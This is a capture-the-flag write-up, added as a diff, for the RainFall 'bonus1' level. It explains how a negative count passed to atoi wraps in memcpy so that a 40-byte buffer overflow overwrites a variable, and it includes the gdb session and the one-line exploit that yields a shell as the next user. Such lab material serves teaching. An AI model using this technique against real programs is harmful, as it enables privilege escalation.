@@ -1,0 +1,117 @@
+This program has a buffer overflow vulnerability.
+
+
+There are 2 key lines in the disassembly of the binary that indicate it :
+
+0x0804842a <+6>:	sub    $0x40,%esp
+...
+0x08048464 <+64>:	lea    0x14(%esp),%eax
+
+We can see that the compiler leaves a lot of room on the stack at the start of
+the main function (0x40 bytes).
+We can also see that a call to memcpy receives an address located on the stack
+as first argument :
+
+0x08048464 <+64>:	lea    0x14(%esp),%eax <==
+...
+0x08048470 <+76>:	mov    %eax,(%esp) <==
+0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
+
+
+Another important detail is that this program makes a call to atoi on the first
+argument in argv and saves the result on the stack at 0x3c($esp).
+
+This means that this main function has 2 local variables, an integer and a
+buffer.
+
+We can calculate the size of the buffer by subtracting the offsets from $esp 
+of each variable :
+
+0x3c - 0x14 = 0x28 (40)
+
+
+The goal of this exercice is to trigger the call to execl by passing a test
+on the value of the variable located at 0x3c($esp) (which will be called count
+from now on).
+
+Count must be inferior to 9, otherwise the program exits :
+
+0x08048438 <+20>:	call   0x8048360 <atoi@plt>
+0x0804843d <+25>:	mov    %eax,0x3c(%esp) 		<== count = atoi(...);
+0x08048441 <+29>:	cmpl   $0x9,0x3c(%esp)
+0x08048446 <+34>:	jle    0x804844f <main+43>	<== if (count > 8)
+0x0804844d <+41>:	jmp    0x80484a3 <main+127>
+...
+0x080484a3 <+127>:	leave							<== return (1);
+
+This value will be used as the length passed to a call to memcpy :
+
+0x0804844f <+43>:	mov    0x3c(%esp),%eax
+0x08048453 <+47>:	lea    0x0(,%eax,4),%ecx	%ecx = count * sizeof(int);
+0x0804845a <+54>:	mov    0xc(%ebp),%eax
+0x0804845d <+57>:	add    $0x8,%eax
+0x08048460 <+60>:	mov    (%eax),%eax
+0x08048462 <+62>:	mov    %eax,%edx			%edx = argv[2];
+0x08048464 <+64>:	lea    0x14(%esp),%eax		%eax = buf;
+0x08048468 <+68>:	mov    %ecx,0x8(%esp)
+0x0804846c <+72>:	mov    %edx,0x4(%esp)
+0x08048470 <+76>:	mov    %eax,(%esp)
+0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
+
+	memcpy(buf, argv[2], count*sizeof(int));
+
+And we can see right after a test on the value of count :
+
+0x08048478 <+84>:	cmpl   $0x574f4c46,0x3c(%esp)
+0x08048480 <+92>:	jne    0x804849e <main+122> <== if (count == 0x574f4c46)
+
+0x574f4c46 is the little-endian representation of the 4 ascii bytes FLOW.
+
+All these details indicate that this program requires a value inferior to 9 as
+a copy length and expects this value to be changed during execution.
+We will use the adjacent buffer to the target variable to override its contents.
+
+We can easily bypass the positive limit on the value of count by passing a
+negative value to atoi.
+memcpy expects a size_t parameter which is an unsigned value.
+We can exploit the binary representation of a negative number so that its
+conversion to an unsigned value will represent a positive value.
+We have to be careful because the value mustn't be too long, otherwise we'll
+erase the return value of the main function.
+The conversion from signed to unsigned integer will drop the sign bit, leaving
+us with the desired value.
+One last thing is that the size is multiplied by 4.
+
+Here is the formula to calculate the wanted value for count :
+
+INT_MIN + (buf_size + count_size / 4) => -2^31 + (40 + 4 / 4) = -2147483637
+
+The last element is the payload passed in argv[2] which will be shown in the
+next example :
+
+(gdb) b *0x08048473
+Breakpoint 1 at 0x8048473 <== set at the call to memcpy
+(gdb) r -2147483637 $(python -c "print 'A' * 40 + 'FLOW'")
+Starting program:
+	/home/user/bonus1/bonus1 -2147483637 $(python -c "print 'A' * 40 + 'FLOW'")
+
+Breakpoint 1, 0x08048473 in main ()
+(gdb) x/24wx $esp
+0xbffff670:	0xbffff684	0xbffff8ae	0x0000002c 0x080482fd
+				^=========v
+0xbffff680:	0xb7fd13e4	0x0000000d	0x08049764	0x080484d1
+0xbffff690:	0xffffffff	0xb7e5edc6	0xb7fd0ff4	0xb7e5ee55
+0xbffff6a0:	0xb7fed280	0x00000000	0x080484b9	0x8000000b
+0xbffff6b0:	0x080484b0	0x00000000	0x00000000	0xb7e454d3
+0xbffff6c0:	0x00000003	0xbffff754	0xbffff764	0xb7fdc858
+
+We can see that the 3rd argument passed to memcpy equals 0x2c (44) and not
+-2147483637.
+
+
+Finally :
+
+bonus1@RainFall:~$ ./bonus1 -2147483637 $(python -c "print 'A' * 40 + 'FLOW'")
+$ whoami
+bonus2
+$
